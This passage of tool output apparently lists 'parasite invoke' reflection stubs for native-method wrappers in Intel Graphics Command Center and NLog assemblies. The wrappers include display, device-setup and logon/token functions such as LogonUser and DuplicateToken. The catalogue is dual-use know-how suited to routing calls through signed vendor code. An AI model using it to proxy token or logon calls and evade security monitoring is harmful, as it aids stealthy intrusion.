        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle, ServiceStatus& serviceStatus });
        ===END SIGNATURE===

Method: RegisterTypeLib
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.COMManager.RegisterLibs"", true);
        var methodInfo = t.GetMethod(""RegisterTypeLib"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { ITypeLib tlib, string szFullPath, string szHelpDir });
        ===END SIGNATURE===

Method: UnRegisterTypeLib
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.COMManager.RegisterLibs"", true);
        var methodInfo = t.GetMethod(""UnRegisterTypeLib"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid& libID, ushort wVerMajor, ushort wVerMinor, int lcid, SYSKIND syskind });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\AGS.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\LiteDB.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\Newtonsoft.Json.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\Newtonsoft.Json.Schema.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll

Method: LogonUser
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LogonUser"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string pszUsername, string pszDomain, string pszPassword, int dwLogonType, int dwLogonProvider, IntPtr& phToken });
        ===END SIGNATURE===

Method: CloseHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CloseHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: DuplicateToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DuplicateToken"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr existingTokenHandle, int impersonationLevel, IntPtr& duplicateTokenHandle });
        ===END SIGNATURE===

Method: OutputDebugString
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""OutputDebugString"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { string message });
        ===END SIGNATURE===

Method: QueryPerformanceCounter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryPerformanceCounter"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { UInt64& lpPerformanceCount });
        ===END SIGNATURE===

Method: QueryPerformanceFrequency
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryPerformanceFrequency"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { UInt64& lpPerformanceFrequency });
        ===END SIGNATURE===

Method: GetCurrentProcessId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetCurrentProcessId"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: GetModuleFileName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetModuleFileName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr hModule, StringBuilder lpFilename, int nSize });
        ===END SIGNATURE===

Method: CreateFile
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.Win32FileNativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateFile"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        Microsoft.Win32.SafeHandles.SafeFileHandle result = (Microsoft.Win32.SafeHandles.SafeFileHandle) methodInfo.Invoke(null, new object[] { string lpFileName, FileAccess dwDesiredAccess, int dwShareMode, IntPtr lpSecurityAttributes, CreationDisposition dwCreationDisposition, Win32FileAttributes dwFlagsAndAttributes, IntPtr hTemplateFile });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.COMLibrary.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CommunicationService.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll

Method: SetCursorPos
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Util.MousePointerManager"", true);
        var methodInfo = t.GetMethod(""SetCursorPos"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { int x, int y });
        ===END SIGNATURE===

Method: GetCursorPos
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Util.MousePointerManager"", true);
        var methodInfo = t.GetMethod(""GetCursorPos"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { MousePoint& lpPoint });
        ===END SIGNATURE===

Method: EnumDisplayDevices
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""EnumDisplayDevices"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpDevice, int iDevNum, DISPLAY_DEVICE& lpDisplayDevice, int dwFlags });
        ===END SIGNATURE===

Method: EnumDisplaySettings
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""EnumDisplaySettings"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { string lpszDeviceName, int iModeNum, DEVMODE& lpDevMode });
        ===END SIGNATURE===

Method: ChangeDisplaySettingsEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChangeDisplaySettingsEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Display.Model.DispModeError result = (OneApp.IGCC.CoreLibrary.Display.Model.DispModeError) methodInfo.Invoke(null, new object[] { string lpszDeviceName, DEVMODE& lpDevMode, IntPtr hwnd, CDSFlags dwflags, IntPtr lParam });
        ===END SIGNATURE===

Method: ChangeDisplaySettingsEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChangeDisplaySettingsEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Display.Model.DispModeError result = (OneApp.IGCC.CoreLibrary.Display.Model.DispModeError) methodInfo.Invoke(null, new object[] { string lpszDeviceName, IntPtr lpDevMode, IntPtr hwnd, CDSFlags dwflags, IntPtr lParam });
        ===END SIGNATURE===

Method: SetDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { uint numPathArrayElements, DCPathInfo[] pathArray, uint numModeInfoArrayElements, DCModeInfo[] modeInfoArray, SdcFlags flags });
        ===END SIGNATURE===

Method: QueryDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, DCPathInfo[] pathInfoArray, UInt32& modeInfoArrayElements, DCModeInfo[] modeInfoArray, DCTopologyId& topologyId });
        ===END SIGNATURE===

Method: QueryDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, DCPathInfo[] pathInfoArray, UInt32& modeInfoArrayElements, DCModeInfo[] modeInfoArray, IntPtr topologyId });
        ===END SIGNATURE===

Method: GetDisplayConfigBufferSizes
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDisplayConfigBufferSizes"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, UInt32& numModeInfoArrayElements });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetDeviceName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetBaseType& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCAdapterName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSourceDeviceName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetPreferredMode& preferredMode });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSupportVirtualResolution& supportVirtualResolution });
        ===END SIGNATURE===

Method: DisplayConfigSetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigSetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSupportVirtualResolution supportVirtualResolution });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetupDiGetClassDevs
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetClassDevs"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { Guid& ClassGuid, int Enumerator, IntPtr hwndParent, uint Flags });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr lpInfoSet, uint dwIndex, SP_DEVINFO_DATA& devInfoData });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInterfaces
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInterfaces"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo, IntPtr devInfo, Guid& interfaceClassGuid, uint memberIndex, SP_DEVICE_INTERFACE_DATA& deviceInterfaceData });
        ===END SIGNATURE===

Method: SetupDiGetDeviceInterfaceDetail
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceInterfaceDetail"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo, SP_DEVICE_INTERFACE_DATA& deviceInterfaceData, SP_DEVICE_INTERFACE_DETAIL_DATA& deviceInterfaceDetailData, uint deviceInterfaceDetailDataSize, UInt32& requiredSize, SP_DEVINFO_DATA& deviceInfoData });
        ===END SIGNATURE===

Method: SetupDiOpenDevRegKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiOpenDevRegKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hDeviceInfoSet, SP_DEVINFO_DATA& deviceInfoData, uint scope, uint hwProfile, uint parameterRegistryValueKind, uint samDesired });
        ===END SIGNATURE===

Method: SetupDiGetDevicePropertyW
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDevicePropertyW"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr deviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, DEVPROPKEY& propertyKey, UInt32& propertyType, IntPtr propertyBuffer, uint propertyBufferSize, UInt32& requiredSize, uint flags });
        ===END SIGNATURE===

Method: SetupDiGetDeviceRegistryPropertyW
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceRegistryPropertyW"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr DeviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, uint Property, UInt32& PropertyRegDataType, IntPtr PropertyBuffer, uint PropertyBufferSize, UInt32& RequiredSize });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr lpInfoSet, uint dwIndex, SP_DEVINFO_DATA devInfoData });
        ===END SIGNATURE===

Method: SetupDiOpenDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiOpenDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr deviceInfoSet, IntPtr deviceInstanceId, IntPtr hwndParent, int openFlags, SP_DEVINFO_DATA deviceInfoData });
        ===END SIGNATURE===

Method: SetupDiGetDeviceRegistryProperty
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceRegistryProperty"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr DeviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, uint Property, UInt32& PropertyRegDataType, Byte[] PropertyBuffer, uint PropertyBufferSize, UInt32& RequiredSize });
        ===END SIGNATURE===

Method: SetupDiCreateDeviceInfoList
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiCreateDeviceInfoList"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { Guid ClassGuid, IntPtr hwndParent });
        ===END SIGNATURE===

Method: SetupDiDestroyDeviceInfoList
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiDestroyDeviceInfoList"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo });
        ===END SIGNATURE===

Method: CreateDC
        ===PARASITE INVOKE SIGNATURE===
